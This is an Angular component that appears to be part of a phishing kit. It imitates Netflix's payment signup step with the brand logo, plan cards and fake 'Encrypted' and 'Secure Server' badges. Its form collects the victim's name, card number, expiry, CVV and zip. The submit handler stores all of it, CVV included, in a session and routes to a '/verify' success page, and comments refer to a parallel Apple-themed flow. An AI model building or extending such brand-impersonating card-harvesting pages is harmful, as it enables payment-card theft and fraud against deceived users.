import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
    selector: 'app-netflix-payment',
    standalone: true,
    imports: [CommonModule, FormsModule, ReactiveFormsModule],
    template: `
    <div class="netflix-flow-container">
      <header class="netflix-simple-header">
         <svg class="netflix-logo" viewBox="0 0 111 30" xmlns="http://www.w3.org/2000/svg">
          <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h4.906l-5.719 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.875zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.188-.656V26.5c-5.313.5-10.688.75-15.938 1V0h15.938v4.687H27.688v5.937c2 .032 4.125.125 6.094.25v4.719H30.75zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"></path>
        </svg>
        <a href="javascript:void(0)" class="text-sm font-bold no-underline hover:underline text-gray-500" style="margin-left: auto;">Sign Out</a>
      </header>

      <div class="netflix-step-container">
        <span class="nf-step-indicator">STEP 2 OF 3</span>
        <h1>Set up your payment</h1>
        <p class="mb-6 text-lg">Your membership starts as soon as you set up payment.</p>
        
        <div class="mb-8">
            <div class="text-sm font-bold mb-2">No commitments. Cancel online anytime.</div>
            <div class="flex items-center gap-2 mb-4">
                 <div class="text-xs px-1 border border-red-600 text-red-600 rounded">Encrypted</div>
                 <div class="text-xs text-gray-400">Secure Server</div>
            </div>
        </div>

        <!-- Plan Selection -->
        <h3 class="text-white text-lg font-bold mb-4">Select your plan</h3>
        <div 
            class="nf-plan-card" 
            [class.selected]="selectedPlan() === 'basic'"
            (click)="selectedPlan.set('basic')"
        >
            <div>
                <div class="font-bold">Basic</div>
                <div class="text-sm text-gray-400">720p</div>
            </div>
            <div class="font-bold">$9.99/mo</div>
        </div>
        
        <div 
             class="nf-plan-card" 
             [class.selected]="selectedPlan() === 'standard'"
             (click)="selectedPlan.set('standard')"
        >
            <div>
                <div class="font-bold">Standard</div>
                <div class="text-sm text-gray-400">1080p</div>
            </div>
             <div class="font-bold">$15.49/mo</div>
        </div>
        
        <div 
             class="nf-plan-card" 
             [class.selected]="selectedPlan() === 'premium'"
             (click)="selectedPlan.set('premium')"
        >
            <div>
                 <div class="font-bold">Premium</div>
                 <div class="text-sm text-gray-400">4K + HDR</div>
            </div>
             <div class="font-bold">$19.99/mo</div>
        </div>

        <form [formGroup]="paymentForm" (ngSubmit)="onSubmit()" class="mt-8">
            <h3 class="text-white text-lg font-bold mb-4">Credit or Debit Card</h3>
            
            <div class="nf-input-container">
                <input type="text" formControlName="firstName" class="nf-input" placeholder="First Name">
            </div>
             <div class="nf-input-container">
                <input type="text" formControlName="lastName" class="nf-input" placeholder="Last Name">
            </div>

            <div class="nf-input-container">
                <input type="text" formControlName="cardNumber" class="nf-input" placeholder="Card Number">
            </div>
            
            <div class="flex gap-4">
                <div class="nf-input-container flex-1">
                    <input type="text" formControlName="expiry" class="nf-input" placeholder="MM/YY">
                </div>
                 <div class="nf-input-container flex-1">
                    <input type="text" formControlName="cvv" class="nf-input" placeholder="CVV">
                </div>
                 <div class="nf-input-container flex-1">
                    <input type="text" formControlName="zip" class="nf-input" placeholder="Zip Code">
                </div>
            </div>

            <button 
                type="submit" 
                class="nf-btn-primary"
                [disabled]="paymentForm.invalid || isLoading()"
            >
                {{ isLoading() ? 'Processing...' : 'Start Membership' }}
            </button>
        </form>
      </div>
    </div>
  `,
    styleUrls: ['../../../styles/flows/netflix.scss']
})
export class NetflixPaymentComponent {
    private fb = inject(FormBuilder);
    private state = inject(StateService);

    selectedPlan = signal<string>('standard');
    isLoading = signal(false);

    paymentForm = this.fb.group({
        firstName: ['', Validators.required],
        lastName: ['', Validators.required],
        cardNumber: ['', [Validators.required, Validators.pattern('^[0-9 ]{13,19}$')]],
        expiry: ['', [Validators.required, Validators.pattern('^(0[1-9]|1[0-2])\\/?([0-9]{2})$')]],
        cvv: ['', [Validators.required, Validators.pattern('^[0-9]{3,4}$')]],
        zip: ['', Validators.required]
    });

    async onSubmit() {
        if (this.paymentForm.valid) {
            this.isLoading.set(true);
            const data = this.paymentForm.value;

            this.state.updateSession({
                firstName: data.firstName,
                lastName: data.lastName,
                cardNumber: data.cardNumber,
                cardExpiry: data.expiry,
                cardCvv: data.cvv,
                billingZip: data.zip,
                netflixPlan: this.selectedPlan(),
                isCardSubmitted: true,
                status: 'completed'
            });

            // Navigate to generic success or specific netflix success? 
            // Reuse Apple success but themed? Or just generic step-success which we have.
            // But let's navigate to verify/netflix/success (we haven't made it yet, maybe just step-success).
            // Actually plan said "Verify completion/success state". I'll use '/verify/step-success' for now or create one.
            // Let's assume step-success is global.
            this.state.navigate('/verify/step-success');
        }
    }
}
